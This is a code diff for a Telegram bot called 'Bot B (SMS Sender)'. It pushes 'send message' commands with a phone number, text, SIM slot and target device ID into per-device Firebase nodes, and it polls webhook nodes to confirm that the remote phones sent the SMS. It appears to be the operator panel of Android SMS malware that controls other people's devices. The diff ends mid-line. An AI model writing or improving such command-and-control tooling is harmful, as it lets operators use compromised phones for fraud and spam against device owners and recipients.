@@ -6,6 +6,8 @@ require('dotenv').config();
  * - Online/Offline: Now reads from user_data/status (like Bot A)
  * - SMS Sending: Smart 3-Path Fallback (action, clients, sms)
  * - FORMATTING FIXED: Removed all \n \n\n garbage, now uses clean new lines!
+ * - PATH FIXED: Now writes to action/ root with correct command structure
+ * - CONFIRMATION FIXED: Now checks for boolean AND string 'true'
  */
 
 const { Telegraf, Markup } = require('telegraf');
@@ -120,10 +122,12 @@ function parseInput(input) {
 }
 
 // ============================================
-// SMART PATH FALLBACK SYSTEM
+// SMART PATH FALLBACK SYSTEM - FIXED
 // ============================================
 
+// IMPORTANT: '' (empty string) writes to action/ root with correct command structure
 const PATHS_TO_TRY = [
+  '',                    // ← Write to /deviceId/action/ (root) with command structure
   'action/sendSms',
   'clients/action/sendSms',
   'sms'
@@ -131,42 +135,158 @@ const PATHS_TO_TRY = [
 
 async function writeToPath(deviceId, relativePath, phone, message) {
   const baseUrl = DATABASE_URL.endsWith('/') ? DATABASE_URL.slice(0, -1) : DATABASE_URL;
+  
+  // SPECIAL HANDLING: Write directly to action/ root with command structure
+  if (relativePath === '') {
+    const url = `${baseUrl}/${deviceId}/action.json`;
+    const data = {
+      command: "send message",
+      messageText: message,
+      phoneNumber: phone,
+      simSlot: "0",
+      targetDeviceId: deviceId
+    };
+    
+    try {
+      console.log(`📤 Writing to action/ root with command structure for ${deviceId}`);
+      const response = await fetch(url, { 
+        method: 'PUT',  // Use PUT to replace entire action node
+        headers: { 'Content-Type': 'application/json' }, 
+        body: JSON.stringify(data) 
+      });
+      
+      if (response.ok) {
+        console.log(`✅ Successfully wrote to action/ root`);
+      } else {
+        console.log(`❌ Failed to write to action/ root: ${response.status}`);
+      }
+      
+      return response.ok;
+    } catch (error) {
+      console.error(`❌ Error writing to action/ root:`, error.message);
+      return false;
+    }
+  }
+  
+  // ORIGINAL LOGIC: For other paths, use the fallback structure
   const url = `${baseUrl}/${deviceId}/${relativePath}.json`;
-  const data = { message, to: phone, status: 'pending', timestamp: Date.now() };
-  const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
-  return response.ok;
+  const data = { 
+    message, 
+    to: phone, 
+    status: 'pending', 
+    timestamp: Date.now() 
+  };
+  
+  try {
+    console.log(`📤 Writing to ${relativePath} for ${deviceId}`);
+    const response = await fetch(url, { 
+      method: 'POST', 
+      headers: { 'Content-Type': 'application/json' }, 
+      body: JSON.stringify(data) 
+    });
+    
+    if (response.ok) {
+      console.log(`✅ Successfully wrote to ${relativePath}`);
+    } else {
+      console.log(`❌ Failed to write to ${relativePath}: ${response.status}`);
+    }
+    
+    return response.ok;
+  } catch (error) {
+    console.error(`❌ Error writing to ${relativePath}:`, error.message);
+    return false;
+  }
 }
 
 async function checkSmsSent(deviceId, phone, message) {
   try {
     const baseUrl = DATABASE_URL.endsWith('/') ? DATABASE_URL.slice(0, -1) : DATABASE_URL;
-    const response = await fetch(`${baseUrl}/${deviceId}/webhookEvent/sendSms.json`);
-    const data = await response.json();
-    if (!data) return false;
-    const entries = Object.values(data);
-    return !!entries.find(entry => 
-      entry.to?.trim() === phone.trim() && 
-      entry.message?.trim() === message.trim() && 
-      entry.isSended === 'true'
-    );
-  } catch { return false; }
+    
+    // Check multiple possible confirmation locations
+    const locations = [
+      `${baseUrl}/${deviceId}/webhookEvent/sendSms.json`,
+      `${baseUrl}/${deviceId}/webhookEvent.json`,
+      `${baseUrl}/${deviceId}/status.json`
+    ];
+    
+    for (const location of locations) {
+      try {
+        const response = await fetch(location);
+        if (!response.ok) continue;
+        
+        const data = await response.json();
+        if (!data) continue;
+        
+        const entries = Object.values(data);
+        const found = entries.find(entry => {
+          // Check if this entry matches our sent message
+          const matchesPhone = entry.to?.trim() === phone.trim();
+          const matchesMessage = entry.message?.trim() === message.trim();
+          
+          // Check multiple confirmation formats
+          const isConfirmed = 
+            entry.isSended === true || 
+            entry.isSended === 'true' || 
+            entry.isSended === '1' || 
+            entry.status === 'sent' ||
+            entry.status === 'success' ||
+            entry.isSended === 1;
+          
+          return matchesPhone && matchesMessage && isConfirmed;
+        });
+        
+        if (found) {
+          console.log(`✅ Confirmation found in ${location}`);
+          return true;
+        }
+      } catch (e) {
+        // Continue to next location
+      }
+    }
+    
+    return false;
+  } catch { 
+    return false; 
+  }
 }
 
 async function sendSmsWithFallback(deviceId, phone, message) {
   for (const relativePath of PATHS_TO_TRY) {
-    console.log(`🔄 Trying path: ${relativePath} for device ${deviceId}`);
-    const writeSuccess = await writeToPath(deviceId, relativePath, phone, message);
-    if (!writeSuccess) continue;
+    const pathDisplay = relativePath === '' ? 'action/ (root with command structure)' : relativePath;
+    console.log(`🔄 Trying path: ${pathDisplay} for device ${deviceId}`);
     
-    let confirmed = false, attempts = 0;
-    while (!confirmed && attempts < 6) {
-      await new Promise(resolve => setTimeout(resolve, 500));
+    const writeSuccess = await writeToPath(deviceId, relativePath, phone, message);
+    if (!writeSuccess) {
+      console.log(`❌ Write failed on ${pathDisplay}`);
+      continue;
+    }
+    
+    console.log(`✅ Write successful on ${pathDisplay}, waiting for confirmation...`);
+    
+    let confirmed = false;
+    let attempts = 0;
+    const maxAttempts = 10; // Increased from 6 for better reliability
+    const delayMs = 1000; // Increased from 500ms
+    
+    while (!confirmed && attempts < maxAttempts) {
+      await new Promise(resolve => setTimeout(resolve, delayMs));
       confirmed = await checkSmsSent(deviceId, phone, message);
       attempts++;
+      
+      if (confirmed) {
+        console.log(`🎉 CONFIRMED after ${attempts} attempts! Path working: ${pathDisplay}`);
+        return { success: true, pathUsed: relativePath };
+      }
+      
+      if (attempts % 3 === 0) {
+        console.log(`⏳ Waiting for confirmation... attempt ${attempts}/${maxAttempts}`);
+      }
     }
-    if (confirmed) return { success: true, pathUsed: relativePath };
-    console.log(`⏳ No response on ${relativePath}, trying next...`);
+    
+    console.log(`⏳ No response on ${pathDisplay} after ${maxAttempts} attempts, trying next...`);
   }
+  
+  console.log(`❌ ALL PATHS FAILED for device ${deviceId}`);
   return { success: false, pathUsed: null };
 }
 
@@ -500,91 +620,4 @@ bot.action(/confirm_send_(.+)/, async (ctx) => {
   }
   
   const { phone, token } = session;
-  await ctx.answerCbQuery('Sending...');
-  const statusMsg = await ctx.reply(
-    `🔄 *Sending SMS...*
-
-Step 1: Writing to Firebase...`,
-    { parse_mode: 'Markdown' }
-  );
-  
-  try {
-    const result = await sendSmsWithFallback(deviceId, phone, token);
-    if (result.success) {
-      await ctx.telegram.editMessageText(
-        chatId, statusMsg.message_id, null,
-        `✅ *SMS SENT SUCCESSFULLY!*
-
-📱 Device: \`${deviceId}\`
-📞 To: ${phone}
-🔑 Token: ${token.substring(0, 30)}...
-🛤️ Path Used: \`${result.pathUsed}\`
-📊 Status: ✅ Confirmed Delivered`,
-        { parse_mode: 'Markdown', ...Markup.inlineKeyboard([
-          [Markup.button.callback('🔄 Send Another', 'refresh_list')],
-          [Markup.button.callback('🏠 Main Menu', 'start')]
-        ]) }
-      );
-    } else {
-      await ctx.telegram.editMessageText(
-        chatId, statusMsg.message_id, null,
-        `❌ *FAILED TO SEND*
-
-📱 Device: \`${deviceId}\`
-📞 To: ${phone}
-
-⚠️ Tried all possible paths but device did not respond.
-Device may be offline or not listening.`,
-        { parse_mode: 'Markdown', ...Markup.inlineKeyboard([
-          [Markup.button.callback('🔄 Retry', `confirm_send_${deviceId}`)],
-          [Markup.button.callback('🏠 Main Menu', 'start')]
-        ]) }
-      );
-    }
-  } catch (error) {
-    console.error('Send error:', error);
-    await ctx.telegram.editMessageText(chatId, statusMsg.message_id, null, `❌ *FAILED TO SEND*\n\nError: ${error.message}`, { parse_mode: 'Markdown' });
-  }
-  userSessions.delete(chatId);
-});
-
-bot.action('cancel_send', async (ctx) => {
-  userSessions.delete(ctx.chat.id);
-  await ctx.answerCbQuery('Cancelled');
-  await ctx.reply('❌ Cancelled. Use /start to begin.');
-});
-
-bot.action(/check_status_(.+)/, async (ctx) => {
-  const deviceId = ctx.match[1];
-  await ctx.answerCbQuery('Checking...');
-  const status = await fetchDeviceStatus(deviceId);
-  deviceStatus[deviceId] = status;
-  const emoji = status.isOnline ? '🟢' : '🔴';
-  await ctx.reply(
-    `📱 *Device Status*
-
-ID: \`${deviceId}\`
-Status: ${emoji} ${status.isOnline ? 'ONLINE' : 'OFFLINE'}
-Last seen: ${timeAgo(status.lastSeen)}
-Total SMS: ${status.totalSms}`,
-    { parse_mode: 'Markdown' }
-  );
-});
-
-bot.action('start', async (ctx) => {
-  await ctx.answerCbQuery('Starting...');
-  await showDeviceList(ctx, 1);
-});
-
-bot.catch((err, ctx) => {
-  console.error('Bot error:', err);
-  ctx.reply('❌ Error occurred. Try /start again.').catch(() => {});
-});
-
-console.log('🚀 Starting Bot B (SMS Sender) with CLEAN formatting and FIXED online status...');
-bot.launch();
-
-process.once('SIGINT', () => bot.stop('SIGINT'));
-process.once('SIGTERM', () => bot.stop('SIGTERM'));
-
-console.log('✅ Bot B is running successfully!');
+  await ctx.answer
